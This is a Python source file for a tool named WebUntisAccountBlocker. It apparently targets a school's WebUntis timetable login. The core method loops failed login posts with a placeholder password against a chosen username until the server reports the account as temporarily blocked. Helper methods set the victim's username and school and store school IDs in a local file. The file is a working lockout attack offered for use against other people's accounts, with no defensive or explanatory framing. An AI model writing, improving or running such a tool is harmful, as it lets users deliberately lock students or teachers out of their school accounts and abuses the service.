"""importing Modules"""
import json
import os
import re

import validators
from bs4 import BeautifulSoup
from requests_html import HTMLSession
from logging_formatter import ConfigLogger


class WebUntisAccountBlocker():
    """class"""
    def __init__(self) -> None:
        self.logger = ConfigLogger().setup()
        self.url = "https://aoide.webuntis.com/WebUntis/j_spring_security_check"
        self.logurl = "https://aoide.webuntis.com/WebUntis/"
        self.payload = {
            'school': 'school',
            'j_username': 'user',
            'j_password': 'password',
            'token': ''
        }

    def block(self):
        """blocks the user"""
        while True:
            #webscapes webuntis
            session = HTMLSession()
            session.post(self.url, data=self.payload)
            page = session.get(self.logurl)
            soup = BeautifulSoup(page.content, 'html.parser')

            #webscarpes if user is banned or not
            try:
                results = soup.find('script')
                stringtext = results.get_text()
                array = stringtext.split(';')
                untis = array[3].strip()
                untis = re.sub(r"\s\s+"," ", untis)
                untis = untis[18:-6].split(',"lastUserName"')[0] +"}}"
                login_status = json.loads(untis)
            except IndexError:
                self.logger.warning("Invalid school input")
                return "Invalid school input"

            error_msg = login_status["loginServiceConfig"]["loginError"]

            if error_msg == "User is temporarily blocked":
                self.logger.info("successfully blocked %s for 30mins", self.payload['j_username'])
                return f"successfully blocked {self.payload['j_username']} for 30mins"
            elif error_msg == "Account expired" or error_msg == "User is inactive":
                self.logger.info(
                    "Failed to block %s, because his account expired or is inactive",
                    self.payload['j_username']
                )
                return f"Failed to block {self.payload['j_username']}"

    def get_saved_schools(self):
        "gets save school id's from file"
        try:
            schoollist = []
            if os.path.isfile("backend/school.dat") is False:
                open('backend/school.dat', 'w+', encoding="utf8")
                return schoollist
            else:
                with open("backend/school.dat", "r", encoding="utf8") as file:
                    lines = file.readlines()
                    if len(lines) > 0:
                        for line in lines:
                            schoollist.append(line.strip()) # remove newlines using strip()
                    self.logger.info("got saved school ids: %s", schoollist)
                    return schoollist
        except (TypeError, KeyError, ValueError) as exeption:
            self.logger.error("Error occurred while getting saved schools: %s", exeption)
            return exeption

    def set_username(self, username):
        """sets the username of the wanted client"""
        try:
            self.payload["j_username"] = username
            self.logger.info("successfully set the username to %s", self.payload['j_username'])
            return f"username set to {self.payload['j_username']}"
        except (TypeError, KeyError, ValueError) as exeption:
            self.logger.error("Error occurred while setting the username: %s", exeption)
            return exeption

    def set_school(self, schoolname):
        """lets the user set the school"""
        try:
            school = schoolname
            validinput = False
            schoollist = self.get_saved_schools()

            # checks for valid school input from url, file or plain text
            while validinput is False:
                if validators.url(school) is True:
                    try:
                        school = school.split('/')[4]
                        school = school.split("=")[1][:-1]
                        validinput = True
                    except IndexError:
                        validinput = False
                elif school.isdigit():
                    school = schoollist[int(school) - 1]
                    validinput = True
                else:
                    validinput = True

            # writes new school to file if its not saved there
            if school not in schoollist:
                with open("backend/school.dat", "a", encoding="utf8") as file:
                    if len(schoollist) > 0:
                        file.write("\n" + school)
                    else:
                        file.write(school)

            self.payload["school"] = school
            self.logger.info("successfully set the school to %s", self.payload['school'])
            return f"school set to {self.payload['school']}"
        except (TypeError, KeyError, ValueError) as exception:
            self.logger.error("Error occurred while setting the school: %s", exception)
            return exception
